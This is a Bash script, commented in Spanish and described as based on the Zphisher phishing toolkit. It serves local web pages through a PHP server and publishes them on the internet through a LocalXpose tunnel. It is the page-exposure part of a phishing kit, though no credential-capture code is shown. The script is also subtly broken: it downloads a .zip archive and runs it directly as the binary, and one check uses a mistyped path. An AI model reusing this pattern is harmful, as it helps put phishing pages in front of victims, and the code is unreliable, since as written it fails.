#!/bin/bash

# Script simplificado para usar LocalXpose y servir solo index.html y styles.css
# Basado en Zphisher

HOST="127.0.0.1"
PORT="8080"

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

# Colocar archivos web
if [[ ! -d ".server/www" ]]; then
    mkdir -p ".server/www"
fi

# Copiar archivos index.html y styles.css
cp -f "$BASE_DIR/index.html" ".server/www/"
cp -f "$BASE_DIR/styles.css" ".server/www/"

# Eliminar logs antiguos
rm -f ".server/.loclx"

# Manejo de señales
trap 'echo -e "\n[!] Programa interrumpido."; exit 0' SIGINT SIGTERM

# Descargar LocalXpose si no existe
download() {
    url="$1"
    output="$2"
    curl -sSL "$url" -o "$output"
    chmod +x "$output"
}

install_localxpose() {
    if [[ ! -f ".server/loclx" ]]; then
        echo "[+] Instalando LocalXpose..."
        arch=$(uname -m)
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"Android"* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ".server/loclx"
        elif [[ "$arch" == *"aarch64"* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ".server/loclx"
        elif [[ "$arch" == *"x86_64"* ]]; then
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ".server/loclx"
        else
            download "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ".server/loclx"
        fi
    fi
}

# Autenticación LocalXpose
localxpose_auth() {
    ./.server/loclx -help > /dev/null 2>&1 &
    sleep 1
    auth_f="$HOME/.localxpose/.access"
    if [[ ! -f "$auth_f" ]] || ./server/loclx account status | grep -q "Error"; then
        echo "[!] Necesitas un token de LocalXpose"
        read -p "Introduce tu token: " token
        echo -n "$token" > "$auth_f"
    fi
}

# Configurar puerto personalizado opcional
cusport() {
    read -n4 -p "Puerto (1024-9999, default 8080): " custom_port
    if [[ "$custom_port" =~ ^[1-9][0-9]{3}$ ]] && [[ "$custom_port" -ge 1024 ]]; then
        PORT="$custom_port"
        echo "Puerto establecido a $PORT"
    else
        echo "Usando puerto por defecto $PORT"
    fi
}

# Iniciar PHP server
setup_site() {
    echo "[+] Iniciando servidor PHP en http://$HOST:$PORT"
    cd .server/www && php -S "$HOST:$PORT" > /dev/null 2>&1 &
}

# Iniciar túnel LocalXpose
start_loclx() {
    cusport
    setup_site
    localxpose_auth
    echo "[+] Iniciando LocalXpose..."
    ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$PORT" > .server/.loclx 2>&1 &
    sleep 10
    url=$(grep -o '[0-9a-zA-Z.]*.loclx.io' .server/.loclx)
    echo "[+] Acceso público: https://$url"
    echo "[+] Servidor corriendo, Ctrl+C para detener."
    wait
}

# Ejecución principal
install_localxpose
start_loclx
